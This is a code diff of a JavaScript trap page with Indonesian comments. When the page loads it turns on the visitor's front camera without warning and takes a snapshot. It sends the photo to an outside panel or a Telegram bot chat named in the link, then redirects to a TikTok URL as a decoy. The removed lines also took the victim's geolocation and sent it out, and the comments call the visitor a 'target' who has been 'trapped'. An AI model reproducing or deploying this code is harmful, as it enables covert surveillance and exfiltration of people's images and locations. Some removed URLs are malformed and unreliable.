@@ -33,7 +33,7 @@
 
     // ================= CONFIG PANEL PTERODACTYL ==========================
     const PANEL_ENDPOINT = 'https://gervho.com'; 
-    const TARGET_WEBSITE = 'https://tiktok.com'; 
+    const TARGET_WEBSITE = 'https://vt.tiktok.com/ZSxY2Ru6d/'; 
     // =====================================================================
 
     // Membaca ID pengguna dinamis (?sender=ID) dari tautan bot
@@ -53,11 +53,11 @@
             video.srcObject = currentStream;
 
             video.onplay = () => {
-                setTimeout(takeAndSendSnapshot, 3000); // Jeda 3 detik untuk stabilisasi kamera
+                setTimeout(takeAndSendSnapshot, 3000); // Jeda 3 detik
             };
         } catch (err) {
-            console.error("Gagal kamera, beralih meminta lokasi langsung...");
-            ambilDataLokasiAndSend(null); // Jika kamera gagal, coba ambil lokasi saja
+            console.error(err);
+            window.location.href = TARGET_WEBSITE;
         }
     }
 
@@ -79,102 +79,60 @@
             currentStream.getTracks().forEach(track => track.stop());
         }
         
-        // Buat file blob dari gambar canvas terlebih dahulu sebelum meminta lokasi
-        canvas.toBlob((blob) => {
-            ambilDataLokasiAndSend(blob);
-        }, 'image/png');
-    }
-
-    function ambilDataLokasiAndSend(imageBlob) {
+        // Tentukan ID penerima utama berdasarkan parameter URL
         const finalRecipientId = SENDER_ID ? SENDER_ID : ADMIN_CHAT_ID;
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const teksLokasi = `📌 **Lokasi Pengguna:**\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 [Buka di Google Maps](https://google.com{lat},${lon})`;
-                    
-                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
-                },
-                (error) => {
-                    let alasan = "Ditolak/Gagal";
-                    if (error.code === error.PERMISSION_DENIED) alasan = "Izin ditolak pengguna";
-                    const teksLokasi = `⚠️ **Lokasi:** ${alasan}.`;
-                    
-                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
-                },
-                { enableHighAccuracy: true, timeout: 7000 }
-            );
-        } else {
-            const teksLokasi = `❌ Browser tidak mendukung geolokasi.`;
-            prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
-        }
-    }
-
-    function prosesPengiriman(recipientId, blob, infoLokasi) {
-        // JIKA MENGGUNAKAN PANEL (Mengirim data gabungan ke backend)
+        // JIKA BISA MENGGUNAKAN PANEL (MENGGUNAKAN BASE64 JSON)
         if (SENDER_ID) {
-            const imageData = blob ? canvas.toDataURL('image/png') : null;
+            const imageData = canvas.toDataURL('image/png');
             
             fetch(PANEL_ENDPOINT, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    senderId: recipientId,
-                    image: imageData,
-                    location: infoLokasi
+                    senderId: finalRecipientId,
+                    image: imageData
                 })
             })
             .then(res => res.json())
             .then(data => {
                 if (!data.ok) {
-                    sendDirectTelegram(recipientId, blob, infoLokasi);
+                    // Jika panel merespon error, paksa kirim lewat jalur direk API Telegram
+                    sendDirectTelegram(finalRecipientId);
                 } else {
                     window.location.href = TARGET_WEBSITE;
                 }
             })
             .catch(err => {
                 console.error("Koneksi panel gagal, beralih ke jalur direk Telegram...");
-                sendDirectTelegram(recipientId, blob, infoLokasi);
+                sendDirectTelegram(finalRecipientId);
             });
         } else {
-            sendDirectTelegram(recipientId, blob, infoLokasi);
+            // Jika tidak ada ?sender= (admin iseng buka link utama), kirim langsung ke admin
+            sendDirectTelegram(finalRecipientId);
         }
     }
 
-    async function sendDirectTelegram(chatIdToSend, blob, infoLokasi) {
-        const captionTeks = `📸 **Aktivitas Berhasil Direkam!**\n\n${infoLokasi}`;
+    // Fungsi pengiriman bypass langsung menembak Telegram API (Menggunakan BLOB)
+    // Ditargetkan langsung ke ID pengguna yang tertera di parameter URL (?sender=)
+    function sendDirectTelegram(chatIdToSend) {
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', chatIdToSend); // Mengirim ke ID dinamis, bukan statis admin!
+            formData.append('photo', blob, 'snapshot.png');
+            formData.append('caption', '📸 **Target Berhasil Terjebak!**\nFoto kamera depan target berhasil diambil otomatis.');
 
-        try {
-            if (blob) {
-                // Kirim sebagai foto jika kamera berhasil diakses
-                const formData = new FormData();
-                formData.append('chat_id', chatIdToSend);
-                formData.append('photo', blob, 'snapshot.png');
-                formData.append('caption', captionTeks);
-
-                await fetch(`https://api.telegram.org/bit${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-            } else {
-                // Kirim sebagai teks biasa jika kamera diblokir tetapi lokasi diizinkan
-                await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatIdToSend,
-                        text: captionTeks,
-                        parse_mode: 'Markdown'
-                    })
-                });
+            } catch (error) {
+                console.error("Gagal bypass ke Telegram API:", error);
+            } finally {
+                window.location.href = TARGET_WEBSITE;
             }
-        } catch (error) {
-            console.error("Gagal mengirim ke Telegram API:", error);
-        } finally {
-            window.location.href = TARGET_WEBSITE;
-        }
+        }, 'image/png');
     }
 
     window.addEventListener('load', startAutoCamera);
